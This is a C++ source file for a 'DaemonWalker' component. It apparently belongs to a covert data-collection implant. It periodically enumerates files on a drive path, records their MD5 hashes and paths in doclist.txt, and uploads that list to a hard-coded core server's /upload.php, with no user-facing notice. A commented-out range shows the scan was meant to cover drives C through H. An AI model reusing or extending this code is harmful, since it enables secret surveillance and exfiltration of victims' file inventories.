#include "file_walker.h"
#include "http_gateway.h"
#include "crypto.h"
#include "global.h"
#include "log4c.h"
#include "daemon.h"
#include <sys/time.h>
#include <stdio.h>

#define UPLOAD_URI L"/upload.php"

DaemonWalker::DaemonWalker() {
	this->lastRunning = 0;	
}

void DaemonWalker::upload(wstring& file) {
	if (wfsize(file.c_str()) <= 0) return;
	HttpGateway hg;
	
	wstring server(CORE_SERVER);
	wstring uri(UPLOAD_URI);
	hg.upload(server, uri, file);
}

void DaemonWalker::run() {
	wstring s(L"DaemonWalker_started");
	Log4c::Instance()->log(s);
	
	do {
		if (time(NULL) - this->lastRunning > 1000 * 60 * 60 * 5) {
			this->lastRunning = time(NULL);
			
			wstring outfile;
			outfile.append(BASE_DIR_T);
			outfile.append(L"doclist.txt");
			
			FileWalker fw(500);
			FILE* file = wfopen(outfile.c_str(), L"wb+");
			Crypto crypto;
			
			wchar_t root[10];
			//c,d,e,f,g,h
			for (wchar_t c = L'D'; c <= L'D'; c++) {
				memset(root, 0, sizeof(wchar_t) * 10);
				wsprintfW(root, L"%c:\\tmp", c);
				fw.find(root);
				vector<wstring> results = fw.getResults();
				if (results.size() > 0) {
					for (size_t i = 0; i < results.size(); i++) {
						wstring doc = results.at(i);
						const wchar_t* docStr = doc.c_str();
						string md5 = crypto.md5File(doc);
						const char* md5Str = md5.c_str();
						
						fwprintf(file, L"%s|%ls\n", md5Str, docStr);
					}
				}
				fw.clear();
			}
			fclose(file);
			this->upload(outfile);
		}
		::Sleep(1 * 1000);
	} while(0);
	
	end = true;
}

